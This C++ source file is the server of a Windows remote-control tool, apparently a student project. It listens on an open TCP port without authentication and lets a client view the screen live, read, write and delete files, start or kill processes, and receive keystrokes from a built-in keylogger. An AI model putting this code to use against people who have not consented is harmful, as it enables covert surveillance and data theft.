// server.cpp : Defines the entry point for the application.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include "stdafx.h"
#include "afxsock.h"
#include "LiveScreen.h"
#include "DirectoryTree.h"
#include "ListProcess.h"
#include "KeyLog.h"
#include "ListApp.h"

#include "framework.h"
#include "server.h"
#include <string>
#include <thread>

#include <windowsx.h>
#include <commctrl.h>
#include <winsock.h>

#include <vector>
#include <gdiplus.h>
#include <gdiplusheaders.h>

#include <psapi.h> 
#include <tlhelp32.h>

#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#pragma comment(lib, "User32.lib")

#pragma comment(lib,"gdiplus.lib")
using namespace Gdiplus;

#include <fstream>
using namespace std;

#define MAX_LOADSTRING 100
#define MAX_THREADS  32


// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

//

LRESULT CALLBACK    OpenServerDialogWndProc(HWND, UINT, WPARAM, LPARAM);
void CreateOpenServerDialogBox(HWND);
void RegisterOpenServerDialogClass(HWND);
int DisplaySuccessulMessageBox();
//
HWND hWnd;
int width;
int height;
HWND buttons[2];
//
bool isContinueFeature[MAX_THREADS];
char serverIP[20];
int commandNum;
bool serverOpened = false; // flag to check if server is listening
    //thread
int     ThreadNr = 0;                // Number of threads started
HANDLE  hThreads[MAX_THREADS] = { NULL };

//Socket and process
bool liveScreen(CSocket& client, int index);
bool accessDirectoryTree(CSocket& client, int index);
bool listOpeningWnd(CSocket& client, int index);
bool listProcess(CSocket& client, int index);
bool keyLog(CSocket& client, int index);
unsigned __stdcall process(void* arg);
bool getIP(char serverIP[]);
unsigned __stdcall openSocket(void* id);


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.
    

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_SERVER, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    //Gdiplus
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SERVER));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    GdiplusShutdown(gdiplusToken);
    return (int) msg.wParam;
}


//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SERVER));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_SERVER);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
   //hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, 500, 300, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:      
        RECT rect;
        if (GetWindowRect(hWnd, &rect))
        {
            width = rect.right - rect.left;
            height = rect.bottom - rect.top;
            /*int IP4 = getIP();
            wchar_t Lbuffer[256];
            wsprintfW(Lbuffer, L"%d", IP4);*/
            RegisterOpenServerDialogClass(hWnd);

            buttons[0] = CreateWindow(TEXT("button"), TEXT("Open server"), WS_VISIBLE | WS_CHILD, width/2 - 70, height/2 - 10, 100, 40, hWnd, (HMENU)1, NULL, NULL);
            buttons[1] = CreateWindow(TEXT("button"), TEXT("Opening"),  WS_CHILD, width / 2 - 70, height / 2 - 10, 100, 40, hWnd, (HMENU)1, NULL, NULL);
        }
    break;

    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            case 1:
                if (!serverOpened) {
                    int count = ThreadNr;
                    hThreads[ThreadNr] =
                        (HANDLE)_beginthreadex(nullptr, 0, openSocket, &count, 0, (unsigned int*)(uintptr_t)ThreadNr);

                    ++ThreadNr;
                    serverOpened = true;
                    MessageBox(
                        NULL,
                        L"Successful Opening!",
                        L"Notification",
                        MB_ICONINFORMATION | MB_OK
                        //MB_ICONEXCLAMATION | MB_YESNO
                    );
                    ShowWindow(buttons[0], SW_HIDE);
                    ShowWindow(buttons[1], SW_NORMAL);
                }
                break;

            case 100:
                DisplaySuccessulMessageBox();
                break;

            case DISPLAY_IP: {
                getIP(serverIP);
                int cSize = strlen(serverIP);
                wstring ip(cSize, L'#');
                mbstowcs(&ip[0], serverIP, cSize);
                wstring display = TEXT("IP Address: ") + ip;
                CreateWindow(TEXT("static"), &display[0], WS_VISIBLE | WS_CHILD, width / 2 - 120, height / 2 - 90, 200, 25, hWnd, (HMENU)1, NULL, NULL);
                break;
            }
            

            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;

    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

int DisplaySuccessulMessageBox()
{
    int msgboxID = MessageBox(
        NULL,
        L"1 client have started to connect yet!",
        L"Notification",
        MB_ICONINFORMATION | MB_OK
        //MB_ICONEXCLAMATION | MB_YESNO
    );

    if (msgboxID == IDYES)
    {
        //TO DO
    }

    return msgboxID;
}

void RegisterOpenServerDialogClass(HWND hwnd)
{ 
    WNDCLASSEX wc = { 0 };   
    wc.cbSize = sizeof(WNDCLASSEX);   
    wc.lpfnWndProc = (WNDPROC)OpenServerDialogWndProc;
    wc.hInstance = hInst;   
    wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);   
    wc.lpszClassName = TEXT("DialogClass");   
    RegisterClassEx(&wc); 
}

void CreateOpenServerDialogBox(HWND hwnd)
{ 
    CreateWindowEx(WS_EX_DLGMODALFRAME | WS_EX_TOPMOST, TEXT("DialogClass"), TEXT("Noti"), 
        WS_VISIBLE | WS_SYSMENU | WS_CAPTION, 400, 400, 350, 150, NULL, NULL, hInst, NULL);
}

LRESULT CALLBACK OpenServerDialogWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg)
    {
        case WM_CREATE:         
            CreateWindow(TEXT("static"), TEXT("Sever opening!"), WS_VISIBLE | WS_CHILD, 
            50, 50, 300, 40, hwnd, (HMENU)1, NULL, NULL);    
            break;     
        case WM_COMMAND:         
            DestroyWindow(hwnd);         
            break;     
        case WM_CLOSE:         
            DestroyWindow(hwnd);         
            break;
    }   
    return (DefWindowProc(hwnd, msg, wParam, lParam));
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}


//Socket 
bool liveScreen(CSocket& client, int index) {
    isContinueFeature[index] = true;
    LiveScreen liveScreen;
    int data_size;

    liveScreen.gdiscreen();
    data_size = liveScreen.data.size() * sizeof(BYTE);
    client.Send(&data_size, sizeof(int), 0);
    if (GetLastError() != 0)
        return false;
    client.Send(&liveScreen.data[0], data_size, 0);
    if (GetLastError() != 0)
        return false;
    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return false;
        switch (commandNum) {
            case CONTINUE_SCREEN: {
                Sleep(100);
                liveScreen.gdiscreen();
                client.Send(&liveScreen.data[0], data_size, 0);
                if (GetLastError() != 0)
                    return false; 
                commandNum = 0;
                break;
            }

            case QUIT_FEATURE: {
                isContinueFeature[index] = false;
                //client.CancelBlockingCall();
                break;
            }
        } 

    } while (isContinueFeature[index]);
    //MessageBox(NULL, L"Quit share screen server", L"Notification", MB_OK);
    return true;
}

bool accessDirectoryTree(CSocket& client, int index) {
    DirectoryTree dt;
    isContinueFeature[index] = true;
    dt.findAvailableDrive();
    int sz_rgDocHeadings = dt.g_rgDocHeadings.size();
    client.Send(&sz_rgDocHeadings, sizeof(int), 0);
    if (GetLastError() != 0)
        return false;
    for (int i = 0; i < sz_rgDocHeadings; ++i) {
        client.Send((char*)&dt.g_rgDocHeadings[i], sizeof(Heading), 0);
        if (GetLastError() != 0)
            return false;
    }

    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return false;
        switch (commandNum) {

        case GET_FOLDER: {
            wstring fullPath;
            if (!dt.receivePath(fullPath, client))
                return false;
            vector<wstring> childDirectory;
            childDirectory = dt.getChildDirectory(fullPath);

            int numDirec = childDirectory.size();
            client.Send(&numDirec, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;
            for (int i = 0; i < numDirec; ++i) {
                int szDirec = sizeof(childDirectory[i]);
                client.Send(&childDirectory[i][0], MAX_HEADING_LEN * sizeof(wchar_t), 0);
                if (GetLastError() != 0)
                    return false;
            }
            break;
        }

        case DELETE_F: {
            wstring fullPath;

            if (!dt.receivePath(fullPath, client))
                return false;
            if (dt.DeleteDirectory(fullPath) == 0) {
                //Delete successfully
                commandNum = 0;
            }
            else {
                commandNum = 1;
            }
            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;


            break;
        }

        case CUT_F: {
            wstring srcPath;
            wstring srcName;
            wstring dstPath;
            WCHAR result[MAX_PATH] = {};

            if (!dt.receivePath(srcPath, client))
                return false;
            if(!dt.receivePath(srcName, client))
                return false;
            if (!dt.receivePath(dstPath, client))
                return false;

            PathCombine(result, &dstPath[0], &srcName[0]);
            if (MoveFile(&srcPath[0], &result[0])) {
                commandNum = 0;
            }
            else {
                commandNum = 1;
            }
            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;

            break;
        }

        case COPY_F: {
            wstring srcPath, srcName, dstPath;
            WCHAR result[MAX_PATH] = {};

            if (!dt.receivePath(srcPath, client))
                return false;
            if (!dt.receivePath(srcName, client))
                return false;
            if (!dt.receivePath(dstPath, client))
                return false;

            PathCombine(result, &dstPath[0], &srcName[0]);
            if (dt.SHCopy(&srcPath[0], &result[0])) { 
            //if (CopyFile(&srcPath[0], &result[0], TRUE)) { //do not overwrite
                commandNum = 0;
            }
            else {
                commandNum = 1;
            }
            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;

            break;
        }

        case SEND_F: {
            vector<char> buffer;
            int length;
            client.Receive(&length, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;
            if (length != 0) {
                buffer.resize(length);
                client.Receive(&buffer[0], length, 0);
                if (GetLastError() != 0)
                    return false;
            }
            wstring dstPath;
            if (!dt.receivePath(dstPath, client))
                return false;
            ofstream fout(dstPath, ios::binary);
            if (fout) {
                fout.flush();
                if (length != 0)
                    fout.write((char*)&buffer[0], buffer.size());
                fout.close();
                commandNum = 0;
            }
            else
                commandNum = 1;
            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;

            break;
        }

        case RECEIVE_F: { //send to client
            //Path of file that need to be sent
            wstring srcName;
            wstring srcPath;
            if (!dt.receivePath(srcPath, client))
                return false;
            //receivePath(srcName, client);

            ifstream fl(srcPath, ios::binary);
            fl.seekg(0, fl.end);
            int length = fl.tellg();
            client.Send(&length, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;
            if (length == -1) {
                commandNum = 1;
            }
            else {
                //if (length == 0) {
                //    commandNum = 0;
                //}

                char* buffer = new char[length];
                fl.seekg(0, fl.beg);
                fl.read((char*)buffer, length);
                fl.close();
                client.Send(buffer, length, 0);
                if (GetLastError() != 0)
                    return false;
                commandNum = 0;

                delete[] buffer;
            }
            break;
        }

        case QUIT_FEATURE: {
            isContinueFeature[index] = false;
            dt.g_rgDocHeadings.clear();
            //client.CancelBlockingCall();
            break;
        }
        }
    } while (isContinueFeature[index]);
    return true;
}

bool listOpeningWnd(CSocket& client, int index) {
    isContinueFeature[index] = true;
    //Send information about running process(es)
    ListApp la;
    if (!la.sendList(client))
        return false;

    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return false;
        switch (commandNum) {
            case UPDATE_LIST_APP: {
                if (!la.sendList(client))
                    return false;
                commandNum = 0;
                break;
            }

            case START_APP: {

                WCHAR processName[MAX_HEADING_LEN];
                client.Receive(&processName, sizeof(processName), 0);
                if (GetLastError() != 0)
                    return false;

                if ((processName[0] != L'\0') && ShellExecute(hWnd, NULL, processName, NULL, NULL, SW_SHOWNORMAL))
                    commandNum = 0;
                else
                    commandNum = 1;

                client.Send(&commandNum, sizeof(int), 0);
                if (GetLastError() != 0)
                    return false;
                break;
            }

            case END_APP: {
                WCHAR buffer[MAX_HEADING_LEN];
                client.Receive(buffer, sizeof(buffer), 0); //Receive threadID
                if (GetLastError() != 0)
                    return false;
                DWORD process_id = _wtoi(buffer);
                const auto explorer = OpenProcess(PROCESS_TERMINATE, false, process_id);
                if (TerminateProcess(explorer, 1))
                    commandNum = 0;
                else
                    commandNum = 1;
                CloseHandle(explorer);
                client.Send(&commandNum, sizeof(int), 0);
                if (GetLastError() != 0)
                    return false; 
                break;
            }

            case QUIT_FEATURE: {
                isContinueFeature[index] = false;
                la.openingWnds.clear();
                //client.CancelBlockingCall();
                break;
            }
        }
    } while (isContinueFeature[index]);
    return true;
}

bool listProcess(CSocket& client, int index) {
    isContinueFeature[index] = true;
    //Send information about running process(es)
    ListProcess lv;
    if (!lv.sendList(client))
        return false;

    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return false; 
        
        switch (commandNum) {

        case UPDATE_LIST: {
            if (!lv.sendList(client))
                return false;
            commandNum = 0;
            break;
        }

        case START_PROCESS: {

            WCHAR processName[MAX_HEADING_LEN];
            client.Receive(&processName, sizeof(processName), 0);
            if (GetLastError() != 0)
                return false;

            if ((processName[0] != L'\0') && ShellExecute(hWnd, NULL, processName, NULL, NULL, SW_SHOWNORMAL))
                commandNum = 0;
            else
                commandNum = 1;

            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false;
            break;
        }
        case END_PROCESS: {
            WCHAR buffer[MAX_HEADING_LEN];
            client.Receive(buffer, sizeof(buffer), 0); //Receive threadID
            if (GetLastError() != 0)
                return false; 
            
            DWORD process_id = _wtoi(buffer);
            const auto explorer = OpenProcess(PROCESS_TERMINATE, false, process_id);
            if (TerminateProcess(explorer, 1))
                commandNum = 0;
            else
                commandNum = 1;
            CloseHandle(explorer);
            client.Send(&commandNum, sizeof(int), 0);
            if (GetLastError() != 0)
                return false; 
            break;
        }

        case QUIT_FEATURE: {
            isContinueFeature[index] = false;
            lv.m_processes.clear();
            //client.CancelBlockingCall();
            break;
        }
        }
    } while (isContinueFeature[index]);
    return true;
}

bool keyLog(CSocket& client, int index) {
    KeyLog kl;
    isContinueFeature[index] = true;
    bool isContinue;

    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return false; 
        
        switch (commandNum) {
            
        case CONTINUE_KEYLOG: {
            char key[20];
            Sleep(10);
            int KEY;
            for (KEY = 8; KEY <= 190; KEY++)
            {
                if (GetAsyncKeyState(KEY) == -32767) {
                    if (kl.SpecialKeys(KEY, key) == false) {
                        //send to client
                        client.Send(&KEY, sizeof(KEY), 0);
                        if (GetLastError() != 0)
                            return false;
                    }
                    else {
                        client.Send(key, sizeof(key), 0);
                        if (GetLastError() != 0)
                            return false;
                    }
                    break;
                }
            }
            if (KEY > 190) {
                memset(key, 0, sizeof(key));
                client.Send(key, sizeof(key), 0);
                //if (GetLastError() != 0)
                //    return false;
            }
            break;
        }

        case QUIT_FEATURE: {
            isContinueFeature[index] = false;
            break;
        }
        }
    } while (isContinueFeature[index]);
    return true;
}

unsigned __stdcall process(void* arg) {
    int index = ThreadNr;
    SOCKET* hConnected = (SOCKET*)arg;
    CSocket client;
    client.Attach(*hConnected);
    do {
        client.Receive(&commandNum, sizeof(int), 0);
        if (GetLastError() != 0)
            return 1;

        switch (commandNum) {
        case LIST_PROCESS: {
            listProcess(client, index);
            break;
        }

        case LIST_APPLICATION: {
            listOpeningWnd(client, index);
            break;
        }

        case DIRECTORY_TREE: {
            accessDirectoryTree(client, index);
            break;
        }

        case LIVE_SCREEN: {
            liveScreen(client, index);
            break;
        }

        case KEYLOG: {
            keyLog(client, index);
            break;
        }
        }
    } while (commandNum != CLOSE_CONNECTION);
    MessageBox(
        NULL,
        L"A client disconnected.",
        L"Notification",
        MB_ICONINFORMATION | MB_OK);
}

bool getIP(char serverIP[]){
    char hostname[MAX_HEADING_LEN];
    gethostname(hostname, 100);
    struct addrinfo hints, * res;
    struct in_addr addr;
    int err;

    WSAData data;
    WSAStartup(MAKEWORD(2, 0), &data);

    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;

    if ((err = getaddrinfo(hostname, NULL, NULL, &res)) != 0) {
        if ((err = getaddrinfo(hostname, NULL, &hints, &res)) != 0) {
            return false;
        }
    }
    res = res->ai_next; //pass 0.0.0.0
    for (res; res != NULL; res = res->ai_next) {
        struct sockaddr_in* saddr = (struct sockaddr_in*)res->ai_addr;
        int size = 20 * sizeof(char);
        memcpy(serverIP, inet_ntoa(saddr->sin_addr), size);
    }


    freeaddrinfo(res);

    WSACleanup();

    return 0;
}

unsigned __stdcall openSocket(void* id)
{
    int nRetCode = 0;

    HMODULE hModule = ::GetModuleHandle(NULL);

    if (hModule != NULL)
    {
        // initialize MFC and print and error on failure
        if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
        {
            // TODO: change error code to suit your needs
            //_tprintf(_T("Fatal Error: MFC initialization failed\n"));
            nRetCode = 1;
        }
        else
        {
            // TODO: code your application's behavior here.
            AfxSocketInit(NULL);

            CSocket server, client;

            server.Create(4567);

            PostMessageA(hWnd, WM_COMMAND, DISPLAY_IP, 0);

            do {
                server.Listen();
                server.Accept(client);
                {
                    PostMessageA(hWnd, WM_COMMAND, 100, 0);
                }
                SOCKET* hConnected = new SOCKET();
                *hConnected = client.Detach();
                hThreads[ThreadNr] =
                    (HANDLE)_beginthreadex(nullptr, 0, process, hConnected, 0, 0);
                ++ThreadNr;

                //_endthreadex(0);
                client.Close();
            } while (1);
            return 0;
        }
    }
    else
    {
        // TODO: change error code to suit your needs
        //_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
        nRetCode = 1;
        return 1;
    }
    return 0;
}

